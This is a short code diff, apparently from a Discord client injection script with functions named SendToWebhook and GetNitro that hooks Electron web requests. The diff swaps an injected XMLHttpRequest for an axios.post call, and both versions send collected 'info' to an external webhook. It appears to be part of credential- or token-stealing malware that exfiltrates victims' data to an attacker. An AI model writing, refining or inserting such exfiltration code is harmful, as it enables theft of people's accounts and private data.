@@ -61,13 +61,8 @@ session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) =>
 })
 
 function SendToWebhook(info) {
-	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
-        xhr.open("POST", "${webhook}", true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-        xhr.send(info);
-    `, !0)
+	const axios = require('axios');
+	axios.post(webhook, info);
 }
 
 function GetNitro(type) {
